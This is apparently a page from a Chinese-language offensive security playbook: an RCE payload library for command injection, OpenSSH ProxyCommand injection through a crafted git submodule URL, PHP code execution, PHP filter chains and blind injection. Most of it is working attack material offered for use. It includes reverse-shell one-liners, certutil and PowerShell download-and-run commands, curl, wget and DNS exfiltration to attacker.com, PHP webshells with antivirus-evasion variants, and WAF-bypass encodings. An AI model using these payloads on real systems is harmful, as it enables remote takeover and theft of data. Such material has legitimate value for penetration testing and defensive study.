# 11-RCE — 命令注入、通用代码执行 payload 库

> 父文档:[[web/实战打法/rce/00-远程代码执行 (RCE) — 决策索引.md|00-index.md]]
> 涵盖系统命令注入 / PHP 代码执行 / PHP Filter 链 / 盲命令注入。框架特定 RCE 见 `10-framework.md`。

---

### 命令注入  `rce-command-injection`
操作系统命令注入攻击技术
子类：**命令注入** · tags: `rce` `command` `injection` `os`

**前置条件：** 存在系统命令执行功能；用户输入未过滤

**攻击链：**

**1. 1. 探测命令注入**
_探测命令注入点_
```
; id
| id
`id`
$(id)
&& id
|| id
test;id
test|id
```

**2. 2. Linux命令注入**  _[linux]_
_Linux系统命令注入_
```
; whoami
; id
; cat /etc/passwd
; ls -la /
; nc -e /bin/bash attacker.com 4444
; bash -i >& /dev/tcp/attacker/4444 0>&1
```

**3. 3. Windows命令注入**  _[windows]_
_Windows系统命令注入_
```
& whoami
& dir
& type C:\windows\win.ini
& certutil -urlcache -split -f http://attacker/shell.exe shell.exe & shell.exe
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/shell.ps1')"
```

**4. 4. 盲命令注入**
_盲命令注入探测_
```
; sleep 5
; ping -c 5 attacker.com
& timeout 5
通过响应时间差异判断命令是否执行
```

**5. 5. 外带数据**  _[linux]_
_通过外带通道获取数据_
```
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id|base64)
; nslookup $(whoami).attacker.com
; ping $(whoami | xxd -p).attacker.com
```

**WAF/EDR 绕过变体：**

**1. 空格绕过**  _[linux]_
_绕过空格过滤_
```
;{cat,/etc/passwd}
;cat$IFS/etc/passwd
;cat</etc/passwd
;cat%09/etc/passwd
;cat${IFS}/etc/passwd
```

**2. 关键字绕过**  _[linux]_
_绕过关键字过滤_
```
; c''at /etc/passwd
; c""at /etc/passwd
; c\at /etc/passwd
; /bin/c?a?t /etc/passwd
; /bin/ca[t] /etc/passwd
```

**3. 编码绕过**  _[linux]_
_使用编码绕过_
```
; echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
; $(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

---

### 配置项展开导致的注入  `rce-config-expansion`
「配置里的变量替换」被当成字符串拼接执行

子类：**配置注入** · tags: `rce` `command` `config` `ssh` `git`

**判据**：程序把用户可控的字符串填进**会做 shell 展开的配置项**。
这类漏洞不在代码的 `exec()` 里，在「配置值本身会被 shell 解释」这一层——所以代码审计看不到，只能按「哪个程序会展开配置」来枚举。

已确认的典型：**OpenSSH `ProxyCommand`（CVE-2023-51385）**。
`~/.ssh/config` 里的 `ProxyCommand` 会把 `%h`（主机名）替换进去，随后整串交给 shell。
主机名里带反引号或 `$()` 就直接执行。

```text
# 受害者的 ~/.ssh/config
Host *.example.com
  ProxyCommand /usr/bin/nc -X connect -x 127.0.0.1:8080 %h %p
```

攻击者只要让受害者 **clone 一个含恶意子模块地址的 git 仓库**，`%h` 就来自 URL：

```bash
# .gitmodules 里把 host 部分写成命令
[submodule "x"]
    path = x
    url = ssh://`curl attacker/s.sh|bash`foo.example.com/bar
```

**为什么必须走 git 子模块**：`git submodule` 会真的去 `ssh` 那个地址，从而触发配置展开。
`--recurse-submodules` 是触发开关。

**构造要点**（踩过的坑）：

| 坑 | 处理 |
|---|---|
| 命令里有 `/` 会被 URL 解析吃掉 | 把命令写进 `exp.sh`，URL 里只放 `bash exp.sh` |
| 直接新建 `.gitmodules` 不生效 | `.git` 下必须有 `modules/` 目录，否则 git 不认 |
| 想让别人 clone 就能打 | 把改好的项目推到公开仓库，让受害者 `--recurse-submodules` |

```bash
git submodule add https://github.com/x/test cve   # 先建出合法结构
vi .gitmodules                                    # 再改 url 成注入串
git add . && git commit -m x
```

**同类枚举方向**（同一个模式的其它落点）：
`git` 的 `core.sshCommand` / `url.<base>.insteadOf`、`rsync -e`、`scp -S`、
`tar --to-command`、`find -exec`、编辑器 `:!` 展开、`make` 的 `$(shell)`。

**结论写法**：报「配置项未过滤导致命令执行」，不要报「命令注入」——修复点不同（前者是转义 `%h`，后者是过滤参数）。

---

### PHP代码执行  `rce-php`
PHP代码执行漏洞利用技术
子类：**PHP代码执行** · tags: `rce` `php` `code` `execution`

**前置条件：** 存在PHP代码执行点；用户输入可控制代码

**攻击链：**

**1. 1. 常见危险函数**
_PHP危险函数_
```
eval($_POST[cmd]);
assert($_POST[cmd]);
preg_replace('/a/e',$_POST[cmd],'a');
create_function('',$_POST[cmd]);
array_map($_POST[func],$_POST[arr]);
call_user_func($_POST[func],$_POST[arg]);
```

**2. 2. 命令执行**
_PHP命令执行函数_
```
system('whoami');
exec('whoami');
shell_exec('whoami');
passthru('whoami');
popen('whoami','r');
proc_open('whoami',$desc,$pipes);
`whoami`;
```

**3. 3. 一句话木马**
_常见一句话木马_
```
<?php @eval($_POST[cmd]);?>
<?php @assert($_POST[cmd]);?>
<?php @system($_GET[cmd]);?>
<?php $a=create_function('',$_POST[cmd]);$a();?>
```

**4. 4. 免杀一句话**
_免杀一句话木马_
```
<?php $a='ev'.$_POST[1];$a($_POST[cmd]);?>
<?php $_='a'.'s'.'s'.'e'.'r'.'t';$_($_POST[cmd]);?>
<?php $a=base64_decode('YXNzZXJ0');$a($_POST[cmd]);?>
```

**WAF/EDR 绕过变体：**

**1. 回调函数绕过**
_使用回调函数_
```
array_map('assert',array($_POST[cmd]));
call_user_func('assert',$_POST[cmd]);
$a='assert';$a($_POST[cmd]);
```

**2. 变量函数绕过**
_WAF绕过技术_
```
$func=$_GET['func'];$cmd=$_GET['cmd'];$func($cmd);
```

---

### PHP Filter链RCE  `rce-php-filter`
利用PHP Filter链构造RCE
子类：**PHP Filter链** · tags: `rce` `php` `filter` `chain`

**前置条件：** 存在文件包含漏洞；PHP版本支持Filter链

**攻击链：**

**1. 1. Filter链原理**
_Filter链原理_
```
利用php://filter的convert.base64-decode等过滤器
通过精心构造的输入，最终生成可执行代码
```

**2. 2. 构造Filter链**
_构造Filter链_
```
php://filter/convert.base64-decode/resource=data://,plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==
使用多个过滤器串联
```

**3. 3. 使用工具生成**
_使用工具生成Filter链_
```
# 使用php_filter_chain_generator
python3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"

# 输出可直接使用的Filter链
```

**4. 4. 完整利用示例**
_完整Filter链示例_
```
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码组合绕过_
```
使用不同编码过滤器组合
绕过关键字检测
```

---

### 盲命令注入  `rce-cmd-blind`
无回显的命令注入利用技术
子类：**盲命令注入** · tags: `rce` `blind` `command` `injection`

**前置条件：** 存在命令注入点；无直接回显

**攻击链：**

**1. 1. 时间盲注**
_使用延时判断_
```
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& timeout 5
观察响应时间判断命令是否执行
```

**2. 2. DNS外带**
_DNS外带数据_
```
; nslookup $(whoami).attacker.com
; ping -c 1 $(whoami).attacker.com
; host $(id | base64).attacker.com
& nslookup %USERNAME%.attacker.com
```

**3. 3. HTTP外带**
_HTTP外带数据_
```
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id)
; curl -d @/etc/passwd http://attacker.com/
& certutil -urlcache -f http://attacker.com/?data=%USERNAME%
```

**4. 4. ICMP外带**  _[linux]_
_ICMP外带数据_
```
; ping -p $(echo "test" | xxd -p) attacker.com
; tcpdump -i eth0 icmp
在攻击者服务器监听ICMP包
```

**5. 5. 反弹Shell**
_反弹Shell_
```
; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
; nc -e /bin/bash attacker 4444
; python -c "import socket,subprocess,os;s=socket.socket();s.connect(('attacker',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**  _[linux]_
_Base64编码绕过_
```
; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==" | base64 -d | bash
使用Base64编码绕过
```

---


---

← 回 [[web/实战打法/rce/00-远程代码执行 (RCE) — 决策索引.md|00-index.md]] · 相关:[[web/实战打法/rce/12-RCE — 通用反序列化 payload 库.md|12-deserialization.md]] · [[web/实战打法/rce/13-RCE — 文件链、上传、包含 payload 库.md|13-file-rce-chain.md]]
